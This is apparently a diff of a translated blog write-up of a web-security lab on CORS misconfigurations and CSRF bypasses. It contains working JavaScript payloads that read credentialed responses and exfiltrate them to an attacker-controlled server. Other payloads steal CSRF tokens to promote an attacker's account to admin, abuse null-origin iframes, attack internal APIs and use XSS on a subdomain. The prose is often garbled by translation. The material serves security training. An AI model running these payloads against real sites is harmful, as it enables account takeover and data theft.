+<p>Before we dive into CORS misconfiguration, let’s discuss possible attack vectors that CORS misconfiguration presents. Most attacks require the <code>Access-Control-Allow-Credentials</code> Header is set to <code>true</code>, thereby obtaining the authentication request in the context of the victim. If a CORS misconfiguration causes an attacker-controlled domain to obtain an exception to the Same Origin Policy, the resulting vulnerability is similar to a CSRF vulnerability, but more severe. Exceptions to the Same Origin Policy allow attacker-controlled domains to access responses to cross-origin requests. Since the request comes from an authentication context, the response contains sensitive information that an attacker could access and steal. Additionally, depending on the specific CORS configuration, it is possible for an attacker to interact with the web application, impersonate the victim and perform actions on their behalf.</p>
+<p>If access is not set up <code>Access-Control-Allow-Credentials</code> ) header, the attacker will be unable to proceed with these attacks. However, misconfiguration of CORS in internal web applications could allow attackers to steal non-public information.</p>
+<blockquote><strong>Note:</strong> Successfully exploiting some of the following CORS misconfigurations may require setting session cookies in real-world web applications <code>SameSite=None</code> properties.</blockquote>
 <h3>Any Origin reflection</h3>
-<p>The <code>Access-Control-Allow-Origin</code> The header contains the origin, allowing the same-origin policy to be bypassed, so the browser allows the origin node to access the response. Additionally, the header can be set to a wildcard (<code>*</code>), which causes all origins to obtain same-origin policy bypass. However, for security reasons, this feature cannot be used with<code>Access-Control-Allow-Credentials: true</code>True header merging, i.e. wildcards can only be used without credentials.</p>
-<blockquote><strong>Note:</strong> A combination of original site and wildcard characters, such as<code>https: //*.cors-misconfigs.htb</code>, is invalid.</blockquote>
-<p>However, some web applications need to allow credentials from multiple sources. For example, imagine a run<code>at https://cors-misconfigs.htb</code> The web application requires authentication and is used by multiple domains such as<code>https://site1.cors-misconfigs.htb</code> and<code>https://site2.cors-misconfigs.htb</code>) use. To achieve this, the web application may read the requested<code>Origin</code> header, and in the response<code>Access-Control-Allow-Origin</code> reflected in the head. This effectively results in a wildcard origin with<code>Access-Control-Allow-Credentials: true</code> The scenario for head binding is the same, but not explicitly prevented by the CORS standard.</p>
-<p>In order to identify CORS misconfigurations that reflect any origin, we need to look for web applications that<code>Access-Control-Allow-Origin</code>) header is set to the original<code>origin</code>An instance that receives the value in the header. We can then send the corresponding request to Burp Repeater and modify the Origin header to a false value, such as<code>thisdoesnnotexist.whatever.htb</code>, and check if the domain is contained in<code>Access-Control-Allow-Origin</code> in the response header. If so, the web application will encounter this CORS configuration error.</p>
+<p>The <code>Access-Control-Allow-Origin</code> The header contains the origin, allowing the same-origin policy to be bypassed, so the browser allows the origin node to access the response. Additionally, the header can be set to a wildcard (<code>*</code>), which causes all origins to obtain same-origin policy bypass. However, for security reasons, this feature cannot be used with <code>Access-Control-Allow-Credentials: true</code> True header merging, i.e. wildcards can only be used without credentials.</p>
+<blockquote><strong>Note:</strong> A combination of original site and wildcard characters, such as <code>https: //*.cors-misconfigs.htb</code>, is invalid.</blockquote>
+<p>However, some web applications need to allow credentials from multiple sources. For example, imagine a run <code>at https://cors-misconfigs.htb</code> The web application requires authentication and is used by multiple domains such as <code>https://site1.cors-misconfigs.htb</code> and <code>https://site2.cors-misconfigs.htb</code>) use. To achieve this, the web application may read the requested <code>Origin</code> header, and in the response <code>Access-Control-Allow-Origin</code> reflected in the head. This effectively results in a wildcard origin with <code>Access-Control-Allow-Credentials: true</code> The scenario for head binding is the same, but not explicitly prevented by the CORS standard.</p>
+<p>In order to identify CORS misconfigurations that reflect any origin, we need to look for web applications that <code>Access-Control-Allow-Origin</code>) header is set to the original <code>origin</code> An instance that receives the value in the header. We can then send the corresponding request to Burp Repeater and modify the Origin header to a false value, such as <code>thisdoesnnotexist.whatever.htb</code>, and check if the domain is contained in <code>Access-Control-Allow-Origin</code> in the response header. If so, the web application will encounter this CORS configuration error.</p>
 <p>① Attacker website:</p>
 <pre><code>evil.com</code></pre>
 <p>② Send a request:</p>
 <pre><code>Origin: http://evil.com  
-Cookie: 你的登录cookie</code></pre>
+Cookie: your_login_cookie</code></pre>
 <p>③ Server misconfiguration (critical)</p>
 <pre><code>Access-Control-Allow-Origin: http://evil.com  
 Access-Control-Allow-Credentials: true</code></pre>
 <p>④ Browser behavior (core)</p>
-<pre><code>浏览器看到: 服务器允许 evil.com 读取数据  
-→ 不再拦截</code></pre>
+<pre><code>The browser sees that the server allows evil.com to read the data.
+→ The browser no longer blocks the response.</code></pre>
 <p>⑤ Result</p>
-<pre><code>evil.com 的 JS 可以拿到响应内容</code></pre>
+<pre><code>JavaScript on evil.com can read the response body.</code></pre>
 <p>Core differences (must be memorized)</p>
-<pre><code>正常: 能发请求, 但读不到数据  
-漏洞: 能发请求, 而且能读到数据</code></pre>
+<pre><code>Normal behavior: the request can be sent, but the response cannot be read.
+Vulnerable behavior: the request can be sent, and the response can be read.</code></pre>
 <p>One more key point (which many people ignore) must be present at the same time:</p>
 <pre><code>Access-Control-Allow-Credentials: true</code></pre>
 <p>Otherwise:</p>
-<pre><code>不会带 cookie → 拿不到用户数据 → 漏洞价值很低</code></pre>
+<pre><code>No cookies are sent → user data cannot be retrieved → impact is much lower.</code></pre>
 <p><strong>Exploitation</strong> To exploit this, an attacker could host a similar payload on their web server, with an arbitrary starting point, e.g.<code>https://exploitserver.htb/exploit</code>: </p>
 <pre><code class="language-html">&lt;script&gt;
     var xhr = new XMLHttpRequest();
@@ -968,10 +968,10 @@ Access-Control-Allow-Credentials: true</code></pre>
     };
     xhr.send();
 &lt;/script&gt;</code></pre>
-<p>Suppose the victim is<code>https://exploitserver.htb/exploit</code> Navigate to the payload while the browser is at<code>https://cors-misconfigs.htb</code> Valid credentials for a misconfigured web application are stored. In this case, due to an insecure CORS configuration, data was accessed from the victim's valid session and exfiltrated to the attacker.</p>
-<p>After visiting the website hosting the payload, the victim's browser will<code>https://cors-misconfigs.htb/data.php</code> Send a cross-origin request with credentials, a session cookie:</p>
+<p>Suppose the victim is <code>https://exploitserver.htb/exploit</code> Navigate to the payload while the browser is at <code>https://cors-misconfigs.htb</code> Valid credentials for a misconfigured web application are stored. In this case, due to an insecure CORS configuration, data was accessed from the victim's valid session and exfiltrated to the attacker.</p>
+<p>After visiting the website hosting the payload, the victim's browser will <code>https://cors-misconfigs.htb/data.php</code> Send a cross-origin request with credentials, a session cookie:</p>
 <img alt="Pasted image 20260415070804" src="assets/posts/advanced-xss-csrf/Pasted image 20260415070804.png"/>
-<p>Since the response reflects the origin in the CORS header and allows credentials, the attacker's origin<code>https://exploitserver.htb</code> An exception to the Same Origin Policy will be granted. As a result, the payload code was allowed to access the response and exfiltrate it by sending it to the attacker's HTTPS exfiltration server:</p>
+<p>Since the response reflects the origin in the CORS header and allows credentials, the attacker's origin <code>https://exploitserver.htb</code> An exception to the Same Origin Policy will be granted. As a result, the payload code was allowed to access the response and exfiltrate it by sending it to the attacker's HTTPS exfiltration server:</p>
 <pre><code>Chenduoduo@htb[/htb]$ python3 server.py 
 
 Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
@@ -990,12 +990,12 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
 <h3>Inappropriate source whitelist</h3>
 <p><strong>Background background</strong></p>
 <p>Web applications must reflect trusted sources against a whitelist of origins, rather than reflecting arbitrary origins. If the check is not done properly, an attacker could bypass it and implement same-origin exceptions for untrusted sources. In particular, implementations that check origin prefixes or suffixes may be vulnerable.</p>
-<p>A common goal for web applications is to trust all subdomains of a certain origin. For example, assuming it's hosted on<code>https://cors-misconfigs.htb</code> The API does this by checking if the source header ends with a string<code>cors-misconfigs.htb</code> End with the Validate Origin header to verify that only sibling subdomains are granted Same Origin Policy exceptions. While the API checks the source before trusting it, this check is poorly implemented because it not only overrides<code>the cors-misconfigs.htb</code> subdomains, and also covers all<code>cors-misconfigs.htb</code> ending domain name.</p>
-<p><strong>Exploitation</strong> Exploiting this CORS misconfiguration is the same as exploiting Arbitrary Origin Reflection (RNR), and an attacker can use the same payload to steal data. However, due to the detection of the origin, the attacker has limitations on where the payload originates. Due to the suffix matching, the attacker cannot use the original<code>https://exploitserver.htb</code> to take advantage of, but you can choose any<code>cors-misconfigs.htb</code> The origin of the ending, for example,<code>https://attackercors-misconfigs.htb</code> Hosting as a payload.</p>
+<p>A common goal for web applications is to trust all subdomains of a certain origin. For example, assuming it's hosted on <code>https://cors-misconfigs.htb</code> The API does this by checking if the source header ends with a string <code>cors-misconfigs.htb</code> End with the Validate Origin header to verify that only sibling subdomains are granted Same Origin Policy exceptions. While the API checks the source before trusting it, this check is poorly implemented because it not only overrides <code>the cors-misconfigs.htb</code> subdomains, and also covers all <code>cors-misconfigs.htb</code> ending domain name.</p>
+<p><strong>Exploitation</strong> Exploiting this CORS misconfiguration is the same as exploiting Arbitrary Origin Reflection (RNR), and an attacker can use the same payload to steal data. However, due to the detection of the origin, the attacker has limitations on where the payload originates. Due to the suffix matching, the attacker cannot use the original <code>https://exploitserver.htb</code> to take advantage of, but you can choose any <code>cors-misconfigs.htb</code> The origin of the ending, for example,<code>https://attackercors-misconfigs.htb</code> Hosting as a payload.</p>
 <h3>Trust null Origin</h3>
-<p><code>Access-Control-Allow-Origin</code>header not only supports trusted starting points and wildcards, but also supports representation<code>null origin</code>The value is empty. Although it should not be used in practice, some web applications may misunderstand its meaning. There are various methods an attacker can use to force a null origin for a cross-origin request, which is then trusted, creating a Same Origin Policy exception.</p>
+<p><code>Access-Control-Allow-Origin</code> header not only supports trusted starting points and wildcards, but also supports representation <code>null origin</code> The value is empty. Although it should not be used in practice, some web applications may misunderstand its meaning. There are various methods an attacker can use to force a null origin for a cross-origin request, which is then trusted, creating a Same Origin Policy exception.</p>
 <p><strong>Exploitation</strong></p>
-<p>The attacker must provide in the cross-origin request<code>null</code>source to exploit this misconfiguration. Any origin can be achieved by using a sandboxed iframe:</p>
+<p>The attacker must provide in the cross-origin request <code>null</code> source to exploit this misconfiguration. Any origin can be achieved by using a sandboxed iframe:</p>
 <pre><code class="language-html">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
@@ -1008,14 +1008,14 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
     };
     xhr.send();
 &lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
-<ul><li><code>sandbox="allow-scripts allow-top-navigation allow-forms</code>, turn on sandbox mode, turn the iframe into a restricted environment, no<code>allow-same-origin</code>, the browser will set the origin of this iframe to<code>null</code>.</li></ul>
-<p>Using this payload, the exploitation method is the same as the previous misconfiguration. However, sandboxing iframes causes cross-origin requests to be<code>null</code>: </p>
+<ul><li><code>sandbox="allow-scripts allow-top-navigation allow-forms</code>, turn on sandbox mode, turn the iframe into a restricted environment, no <code>allow-same-origin</code>, the browser will set the origin of this iframe to <code>null</code>.</li></ul>
+<p>Using this payload, the exploitation method is the same as the previous misconfiguration. However, sandboxing iframes causes cross-origin requests to be <code>null</code>: </p>
 <img alt="Pasted image 20260415174331" src="assets/posts/advanced-xss-csrf/Pasted image 20260415174331.png"/>
 <h3>Target local network</h3>
 <p><strong>Background background</strong></p>
 <p>Even if the web application is not configured with CORS allowed credentials, attackers may still be able to target web applications that are not publicly accessible on the local network running behind a firewall, reverse proxy, or NAT. If these internal web applications do not require authentication and contain CORS misconfigurations that trust the attacker's origin, data theft may be possible.</p>
-<p>If authentication is not required, access is not required<code>Access-Control-Allow-Credentials</code> CORS header. Therefore, in addition to the CORS misconfigurations discussed so far, wildcard origins can lead to misconfigurations that can be exploited in these cases. For example, suppose an internal API that does not require authentication is hosted on<code>https://172.16.0.2</code>. Additionally, the API is<code>Access-Control-Allow-Origin</code>Set a wildcard so all origins are trusted.</p>
-<p><strong>Exploitation</strong> The only protection the API has is that it can only be accessed from within the internal network; however, wildcard origin allows any attacker-controlled origin to steal data while the victim has access. Since no authentication is required, we do not need to set it in the payload<code>withCredentials</code> Options:</p>
+<p>If authentication is not required, access is not required <code>Access-Control-Allow-Credentials</code> CORS header. Therefore, in addition to the CORS misconfigurations discussed so far, wildcard origins can lead to misconfigurations that can be exploited in these cases. For example, suppose an internal API that does not require authentication is hosted on <code>https://172.16.0.2</code>. Additionally, the API is <code>Access-Control-Allow-Origin</code> Set a wildcard so all origins are trusted.</p>
+<p><strong>Exploitation</strong> The only protection the API has is that it can only be accessed from within the internal network; however, wildcard origin allows any attacker-controlled origin to steal data while the victim has access. Since no authentication is required, we do not need to set it in the payload <code>withCredentials</code> Options:</p>
 <pre><code class="language-html">&lt;script&gt;
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://172.16.0.2/data.php', true);
@@ -1041,21 +1041,21 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
     };
     xhr.send();
 &lt;/script&gt;</code></pre>
-<p>However, there are drawbacks to using GET requests for data theft. First, control<code>location</code>This results in a redirect, making the XSS attack obvious to the victim because the website displayed in their browser changes. So in the background use<code>fetch</code> or<code>XMLHttpRequest</code> By initiating a filtering request, the operational security effect is significantly better. Secondly, URL length is not unlimited. Therefore, if the data we are trying to exfiltrate is too large, the payload may fail.</p>
+<p>However, there are drawbacks to using GET requests for data theft. First, control <code>location</code> This results in a redirect, making the XSS attack obvious to the victim because the website displayed in their browser changes. So in the background use <code>fetch</code> or <code>XMLHttpRequest</code> By initiating a filtering request, the operational security effect is significantly better. Secondly, URL length is not unlimited. Therefore, if the data we are trying to exfiltrate is too large, the payload may fail.</p>
 <h2>Bypassing CSRF Token via CORS misconfiguration</h2>
 <p>In addition to the previously mentioned attack vectors, CORS misconfigurations can be exploited to bypass CSRF defenses and conduct a CSRF attack, even if appropriate defenses are in place.</p>
-<p>If CORS is configured incorrectly so that the session cookie is sent at the same time as the cross-origin request, it is set<code>Access-Control-Allow-Credentials</code>, we can effectively bypass the same-origin policy. In this case, common CSRF defenses are ineffective, as we will discuss in this section.</p>
+<p>If CORS is configured incorrectly so that the session cookie is sent at the same time as the cross-origin request, it is set <code>Access-Control-Allow-Credentials</code>, we can effectively bypass the same-origin policy. In this case, common CSRF defenses are ineffective, as we will discuss in this section.</p>
 <h3>Defense bypass: CSRF Token</h3>
 <p>If we can bypass the same-origin policy due to a CORS misconfiguration, we can access the responses to cross-origin requests we make. This allows us to send a cross-origin request to the endpoint that created a valid CSRF token, read that token, embed it in a state-changed cross-origin request, and send the state-changed cross-origin request with a valid CSRF token. Since all of this happens within the victim's session, the CSRF token is still valid even if properly inspected and bound to the victim's user session.</p>
-<p>However, in order for the victim's browser to send the victim's session cookie along with the JavaScript request, we require that the vulnerable web application explicitly<code>SameSite</code> The cookie attribute is set to<code>null</code>, in addition to handling CORS configuration errors. According to the spec, this is only allowed via<code>secure</code> Cookie attribute transfer, which only implements cookie transfer over a secure HTTPS connection. Cookies are not sent over any unencrypted HTTP connection.</p>
-<p>Due to this limitation, the sample web app and all other lab components are only accessible via HTTPS. If we analyze the web application, we can notice that the application sets<code>Access-Control-Allow-Origin</code>and<code>Access-Control-Allow-Credentials</code>CORS header indicating that we should check for CORS configuration errors. Additionally, the session cookie is set at the same time<code>Secure</code> and<code>SameSite=None</code> These two cookie properties:</p>
+<p>However, in order for the victim's browser to send the victim's session cookie along with the JavaScript request, we require that the vulnerable web application explicitly <code>SameSite</code> The cookie attribute is set to <code>null</code>, in addition to handling CORS configuration errors. According to the spec, this is only allowed via <code>secure</code> Cookie attribute transfer, which only implements cookie transfer over a secure HTTPS connection. Cookies are not sent over any unencrypted HTTP connection.</p>
+<p>Due to this limitation, the sample web app and all other lab components are only accessible via HTTPS. If we analyze the web application, we can notice that the application sets <code>Access-Control-Allow-Origin</code> and <code>Access-Control-Allow-Credentials</code> CORS header indicating that we should check for CORS configuration errors. Additionally, the session cookie is set at the same time <code>Secure</code> and <code>SameSite=None</code> These two cookie properties:</p>
 <img alt="Pasted image 20260415185929" src="assets/posts/advanced-xss-csrf/Pasted image 20260415185929.png"/>
-<p>We can analyze the HTTP<code>Origin</code> Response to different values of the head. If we provide an arbitrary value, we can see that the web application is indeed misconfigured because the arbitrary origin is reflected in<code>Access-Control-Allow-Origin</code>The CORS header:</p>
+<p>We can analyze the HTTP<code>Origin</code> Response to different values of the head. If we provide an arbitrary value, we can see that the web application is indeed misconfigured because the arbitrary origin is reflected in <code>Access-Control-Allow-Origin</code> The CORS header:</p>
 <img alt="Pasted image 20260415190236" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190236.png"/>
-<p>we can use<code>SameSite=None</code> The cookie attribute exploits CORS misconfiguration to bypass proper CSRF protection and conduct a CSRF attack. Let’s further analyze the web application to identify potential targets for this attack.</p>
+<p>we can use <code>SameSite=None</code> The cookie attribute exploits CORS misconfiguration to bypass proper CSRF protection and conduct a CSRF attack. Let’s further analyze the web application to identify potential targets for this attack.</p>
 <p>As before, the web application implements the ability to promote user accounts to administrators. This time, the corresponding POST request is properly protected by the CSRF token:</p>
 <img alt="Pasted image 20260415190439" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190439.png"/>
-<p>We wrote an exploit that obtained a valid CSRF token in the victim's session and then made the corresponding cross-origin request, forcing the victim to elevate our user account to administrator privileges. The CSRF token is the response to<code>/profile.php</code> GET request sent by the endpoint. We can make the appropriate request, parse the response, and extract the CSRF token using JavaScript code like the following:</p>
+<p>We wrote an exploit that obtained a valid CSRF token in the victim's session and then made the corresponding cross-origin request, forcing the victim to elevate our user account to administrator privileges. The CSRF token is the response to <code>/profile.php</code> GET request sent by the endpoint. We can make the appropriate request, parse the response, and extract the CSRF token using JavaScript code like the following:</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
 xhr.withCredentials = true;
@@ -1087,7 +1087,7 @@ csrf_req.send(params);</code></pre>
     csrf_req.withCredentials = true;
     csrf_req.send(params);
 &lt;/script&gt;</code></pre>
-<p>If we look at the exploit, we can see an authenticated GET request made to<code>/profile.php</code>, followed by<code>profile.php</code> An authenticated POST request with a valid CSRF token. Therefore, our exploit should work. After delivering the email to the victim and waiting a few seconds, our user was promoted to administrator. Therefore, we successfully exploited the CORS misconfiguration to bypass the CSRF protection and successfully conduct a CSRF attack:</p>
+<p>If we look at the exploit, we can see an authenticated GET request made to <code>/profile.php</code>, followed by <code>profile.php</code> An authenticated POST request with a valid CSRF token. Therefore, our exploit should work. After delivering the email to the victim and waiting a few seconds, our user was promoted to administrator. Therefore, we successfully exploited the CORS misconfiguration to bypass the CSRF protection and successfully conduct a CSRF attack:</p>
 <img alt="Pasted image 20260415190555" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190555.png"/>
 <p>Elevate permissions directly on the login page</p>
 <img alt="Pasted image 20260415194750" src="assets/posts/advanced-xss-csrf/Pasted image 20260415194750.png"/>
@@ -1119,7 +1119,7 @@ r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
 r.withCredentials=true;
 r.send('promote=htb-stdnt&amp;csrf_token='+t);
 &lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
-<ul><li>Server allows<code>Origin:null</code>, so set it to sandbox to put this subpage in an isolated environment.</li></ul>
+<ul><li>Server allows <code>Origin:null</code>, so set it to sandbox to put this subpage in an isolated environment.</li></ul>
 <pre><code class="language-js"># The server allows \`Origin:null\`, so set it to sandbox to put this subpage in an isolated environment.
 &lt;iframe sandbox="allow-scripts allow-forms"
 
@@ -1149,28 +1149,28 @@ r.send('promote=htb-stdnt&amp;csrf_token='+t);
 <blockquote>Let the remote admin browser help us upgrade our account to admin permissions</blockquote>
 <h2>Other CSRF exploits</h2>
 <h3>Combining attack vectors to bypass SameSite Cookie</h3>
-<p>The web browser determines the origin of the request<code>site</code>  and destination, which determines whether to send the SameSite cookie. This is consistent with the same-origin policy considerations mentioned a few sections ago.<code>origin</code>Different. The key difference is that ports and subdomains are not considered part of the website. Therefore, even if the port and subdomain name are different, the two domain names are still considered the same site, and in some cases, cross-origin requests are still considered the same site. Consider the following example:</p>
-<ul><li><code>https://vulnerable.htb</code> and<code>https://sub.vulnerable.htb</code> All SameSite</li><li><code>https://vulnerable.htb</code> and<code>https://vulnerable.htb:9001</code> It's all SameSite.</li><li><code>https://vulnerable.htb</code> and<code>https://sub.vulnerable.htb:9001</code> All SameSite</li></ul>
-<ul><li><code>http://vulnerable.htb</code> and<code>https://vulnerable.htb</code> None of them are SameSite.</li><li><code>https://vulnerable.htb</code> and<code>https://exploitserver.htb</code> _Not_ SameSite.</li></ul>
-<p>We can exploit this behavior to bypass restrictions imposed by SameSite Cookies. For example, when a session cookie sets the SameSite property to<code>Lax</code>, will only be sent for secure requests (such as GET requests). SameSite protection has no effect if the web application contains any state change endpoints accessed via GET requests. The same situation occurs if all state switching operations use POST requests, but the web application is misconfigured to accept GET requests.</p>
-<p>If you must bypass<code>strict</code>With SameSite limitations, we can combine the above misconfiguration with a client-side redirection of the target site. If we write a payload that sends the victim to the client redirect endpoint, the client redirect is initiated by the target site and therefore is considered SameSite. Therefore, even if the SameSite property is set to<code>strict</code>, the victim's cookie is also sent with the request. A successful CSRF attack can be performed if we redirect the victim to a misconfigured endpoint that accepts GET requests for state change operations.</p>
+<p>The web browser determines the origin of the request <code>site</code>  and destination, which determines whether to send the SameSite cookie. This is consistent with the same-origin policy considerations mentioned a few sections ago.<code>origin</code> Different. The key difference is that ports and subdomains are not considered part of the website. Therefore, even if the port and subdomain name are different, the two domain names are still considered the same site, and in some cases, cross-origin requests are still considered the same site. Consider the following example:</p>
+<ul><li><code>https://vulnerable.htb</code> and <code>https://sub.vulnerable.htb</code> All SameSite</li><li><code>https://vulnerable.htb</code> and <code>https://vulnerable.htb:9001</code> It's all SameSite.</li><li><code>https://vulnerable.htb</code> and <code>https://sub.vulnerable.htb:9001</code> All SameSite</li></ul>
+<ul><li><code>http://vulnerable.htb</code> and <code>https://vulnerable.htb</code> None of them are SameSite.</li><li><code>https://vulnerable.htb</code> and <code>https://exploitserver.htb</code> _Not_ SameSite.</li></ul>
+<p>We can exploit this behavior to bypass restrictions imposed by SameSite Cookies. For example, when a session cookie sets the SameSite property to <code>Lax</code>, will only be sent for secure requests (such as GET requests). SameSite protection has no effect if the web application contains any state change endpoints accessed via GET requests. The same situation occurs if all state switching operations use POST requests, but the web application is misconfigured to accept GET requests.</p>
+<p>If you must bypass <code>strict</code> With SameSite limitations, we can combine the above misconfiguration with a client-side redirection of the target site. If we write a payload that sends the victim to the client redirect endpoint, the client redirect is initiated by the target site and therefore is considered SameSite. Therefore, even if the SameSite property is set to <code>strict</code>, the victim's cookie is also sent with the request. A successful CSRF attack can be performed if we redirect the victim to a misconfigured endpoint that accepts GET requests for state change operations.</p>
 <blockquote><strong>Note:</strong> This bypass only works for client-side redirects, not server-side redirects such as HTTP 3xx status codes.</blockquote>
-<p>For example, consider the following web application that sets the SameSite cookie attribute of the session cookie to<code>strict</code>: </p>
+<p>For example, consider the following web application that sets the SameSite cookie attribute of the session cookie to <code>strict</code>: </p>
 <img alt="Pasted image 20260415202639" src="assets/posts/advanced-xss-csrf/Pasted image 20260415202639.png"/>
 <p>Interestingly, the web app redirects us to a temporary page after successful login, which then redirects to our profile:</p>
 <img alt="Pasted image 20260415202651" src="assets/posts/advanced-xss-csrf/Pasted image 20260415202651.png"/>
-<p>Looking at the source code we can see that the resulting redirect is via HTML<code>meta</code>Tag implementation, which is a client-side redirection:</p>
-<p>Additionally, we can pass<code>user</code>The GET parameter injects additional GET parameters into the URL, as the web app appears to copy the parameter in the redirect URL:</p>
+<p>Looking at the source code we can see that the resulting redirect is via HTML<code>meta</code> Tag implementation, which is a client-side redirection:</p>
+<p>Additionally, we can pass <code>user</code> The GET parameter injects additional GET parameters into the URL, as the web app appears to copy the parameter in the redirect URL:</p>
 <img alt="Pasted image 20260415203605" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203605.png"/>
-<p>The user profile has the CSRF vulnerability discussed a few sections ago, allowing us to pass<code>/profile.php？promote=htb-stdnt</code> Endpoint promotion users. However, since the SameSite property is set to<code>Strict</code>, our previous load wasn't working properly. Instead, we can leverage client-side redirection to engineer a successful CSRF exploit. To do this, we must ensure that the victim has access to the terminal, thus enabling client redirection. Additionally, the victim needs to be redirected to a directory containing<code>promote=htb-stdnt</code> GET parameter URL to elevate the user to administrator privileges. We can achieve this through a payload similar to the following:</p>
+<p>The user profile has the CSRF vulnerability discussed a few sections ago, allowing us to pass <code>/profile.php？promote=htb-stdnt</code> Endpoint promotion users. However, since the SameSite property is set to <code>Strict</code>, our previous load wasn't working properly. Instead, we can leverage client-side redirection to engineer a successful CSRF exploit. To do this, we must ensure that the victim has access to the terminal, thus enabling client redirection. Additionally, the victim needs to be redirected to a directory containing <code>promote=htb-stdnt</code> GET parameter URL to elevate the user to administrator privileges. We can achieve this through a payload similar to the following:</p>
 <pre><code class="language-html">&lt;script&gt;
 document.location = "https://vulnerablesite.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
 &lt;/script&gt;</code></pre>
 <p>This payload is set up as our exploit and delivered to the victim, successfully performing a CSRF attack. Subsequently, we gained admin rights to the web application.</p>
 <p>Finally, since subdomains are treated as SameSite, we can exploit XSS vulnerabilities in subdomains to bypass SameSite cookie restrictions. In this case, cross-origin requests are treated as SameSite. As a result, the victim's cookie is sent with the request, allowing a successful CSRF attack. We will explore this scenario in more detail in subsequent chapters.</p>
-<p>Looking at our sample web app, you can see that it sets the session cookie<code>SameSite=Strict</code> Property to prevent cookies from being sent via any cross-site requests:</p>
+<p>Looking at our sample web app, you can see that it sets the session cookie <code>SameSite=Strict</code> Property to prevent cookies from being sent via any cross-site requests:</p>
 <img alt="Pasted image 20260415203729" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203729.png"/>
-<p>However, as we discussed earlier, subdomains are considered part of the same website. So, let’s try to identify subdomains that may be affected by XSS. we can use<code>gobuster</code> To achieve:</p>
+<p>However, as we discussed earlier, subdomains are considered part of the same website. So, let’s try to identify subdomains that may be affected by XSS. we can use <code>gobuster</code> To achieve:</p>
 <pre><code>Chenduoduo@htb[/htb]$ gobuster vhost -k -u https://vulnerablesite.htb -w /path/to/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 
 &lt;SNIP&gt;
@@ -1182,9 +1182,9 @@ Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
 ===============================================================
 2023/08/26 12:09:43 Finished
 ===============================================================</code></pre>
-<p>By viewing subdomains<code>https://guestbook.vulnerablesite.htb</code>, we can identify the guestbook web application mentioned a few sections ago. We can confirm that the same XSS vulnerability still exists:</p>
+<p>By viewing subdomains <code>https://guestbook.vulnerablesite.htb</code>, we can identify the guestbook web application mentioned a few sections ago. We can confirm that the same XSS vulnerability still exists:</p>
 <img alt="Pasted image 20260415203947" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203947.png"/>
-<p>Assume that the administrator who monitors guestbook entries is also<code>https://vulnerablesite.htb</code> Logging into the main application, we can exploit this XSS vulnerability to bypass SameSite restrictions and let administrators promote our users to administrators. To do this, we need to force the admin user to send a corresponding POST request, which can be achieved with the following XSS payload:</p>
+<p>Assume that the administrator who monitors guestbook entries is also <code>https://vulnerablesite.htb</code> Logging into the main application, we can exploit this XSS vulnerability to bypass SameSite restrictions and let administrators promote our users to administrators. To do this, we need to force the admin user to send a corresponding POST request, which can be achieved with the following XSS payload:</p>
 <pre><code class="language-html">&lt;script&gt;
     var csrf_req = new XMLHttpRequest();
     var params = 'promote=htb-stdnt';
@@ -1197,10 +1197,10 @@ Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
 <p>After posting our payload to the guestbook and waiting for a few seconds for the admin user to access the page, we can see that the CSRF attack was successful and our user has been promoted:</p>
 <img alt="Pasted image 20260415204018" src="assets/posts/advanced-xss-csrf/Pasted image 20260415204018.png"/>
 <h3>Weak Token Explosion</h3>
-<p>as<code>Session Security</code>As briefly discussed in the module, weak CSRF tokens can be bypassed to launch a successful CSRF attack. A simple bypass is possible when the CSRF token is not bound to the user session. In this scenario, an attacker accessing a compromised web application could add a valid CSRF token to a cross-origin request from their own session. The backend then accepts cross-initiated requests from the victim session because the CSRF token is valid. Another example is that CSRF tokens are not completely random, making them predictable. Depending on how the CSRF token is created (such as a hash of the username or the current timestamp), we may be able to guess it in one shot, or brute force the payload.</p>
+<p>as <code>Session Security</code> As briefly discussed in the module, weak CSRF tokens can be bypassed to launch a successful CSRF attack. A simple bypass is possible when the CSRF token is not bound to the user session. In this scenario, an attacker accessing a compromised web application could add a valid CSRF token to a cross-origin request from their own session. The backend then accepts cross-initiated requests from the victim session because the CSRF token is valid. Another example is that CSRF tokens are not completely random, making them predictable. Depending on how the CSRF token is created (such as a hash of the username or the current timestamp), we may be able to guess it in one shot, or brute force the payload.</p>
 <p>This time, the web application has been protected with a CSRF token, so normal CSRF attacks will no longer succeed. However, if we obtain multiple CSRF tokens, we can infer that this is an incrementing number, perhaps similar to a counter, and thus can be brute-forced:</p>
 <img alt="Pasted image 20260415204116" src="assets/posts/advanced-xss-csrf/Pasted image 20260415204116.png"/>
-<p>If we analyze the CSRF tokens more closely, we can see that the CSRF token is simply the current time as a Unix timestamp. This makes CSRF tokens predictable and allows us to create viable vulnerabilities to perform CSRF attacks. To do this, we must correctly guess the victim's CSRF token, which was the victim's last access before accessing our payload<code>/profile.php</code> The time of the endpoint. Since the default SameSite<code>Lax</code> Due to the limitations of the policy, we cannot use JavaScript code to dynamically brute force the CSRF token, so it is difficult to accurately grasp the timing. Therefore, we need to hardcode the guessed CSRF tokens in the HTML form and update the value for each guess:</p>
